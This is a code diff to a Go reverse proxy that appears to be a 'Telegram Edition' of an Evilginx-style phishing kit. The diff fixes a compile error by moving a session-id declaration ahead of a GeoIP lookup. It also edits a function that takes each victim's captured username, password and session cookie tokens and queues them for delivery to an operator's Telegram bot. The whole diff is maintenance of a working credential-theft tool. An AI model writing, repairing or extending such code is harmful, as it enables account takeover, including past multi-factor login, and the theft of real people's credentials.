@@ -375,6 +375,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                 if err == nil {
                                     p.extractParams(session, req.URL)
 
+                                    // ========================================================
+                                    // FIX: sid is now defined BEFORE the GeoIP block
+                                    // that references it. This eliminates the compile error:
+                                    // "undefined: sid"
+                                    // ========================================================
+                                    sid := p.last_sid
+                                    p.last_sid += 1
+
                                     // === GeoIP Lookup (Telegram Edition by @officialmonsterz) ===
                                     if p.geoIP != nil {
                                         geo := p.geoIP.Lookup(remote_addr)
@@ -425,8 +433,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                         }
                                     }
 
-                                    sid := p.last_sid
-                                    p.last_sid += 1
                                     log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
                                     log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
                                     p.sessions[session.Id] = session
@@ -2299,35 +2305,35 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
     if sid == "" {
         return
     }
-    
+
     botToken := p.cfg.GetTelegramBotToken()
     chatId := p.cfg.GetTelegramChatID()
-    
+
     if botToken == "" || chatId == "" {
         log.Debug("Telegram: bot token or chat ID not configured, skipping notification")
         return
     }
-    
+
     // Wait a moment for credentials/cookies to be fully set
     time.Sleep(2 * time.Second)
-    
+
     // Read from IN-MEMORY sessions - NO database query
     p.session_mtx.Lock()
     s, exists := p.sessions[sid]
     p.session_mtx.Unlock()
-    
+
     if !exists {
         log.Warning("Telegram: session %s not found in memory", sid)
         return
     }
-    
+
     p.session_mtx.Lock()
     username := s.Username
     password := s.Password
     remoteAddr := s.RemoteAddr
     userAgent := s.UserAgent
     phishletName := s.Name
-    
+
     // Build a TSession from the in-memory session
     ts := TSession{
         ID:         0,
@@ -2341,7 +2347,7 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
         CreateTime: time.Now().Unix(),
         UpdateTime: time.Now().Unix(),
     }
-    
+
     // Convert CookieTokens to map[string]interface{} for TSession
     ts.Tokens = make(map[string]interface{})
     for domain, tokens := range s.CookieTokens {
@@ -2356,12 +2362,12 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
         }
         ts.Tokens[domain] = domainTokens
     }
-    
+
     p.session_mtx.Unlock()
-    
+
     // Use the QUEUE-BASED notification system instead of raw HTTP
     // This properly creates formatted messages with cookie files
     GetTelegramQueue().Enqueue(ts, chatId, botToken)
-    
+
     log.Success("Telegram notification queued for session: %s", sid)
 }
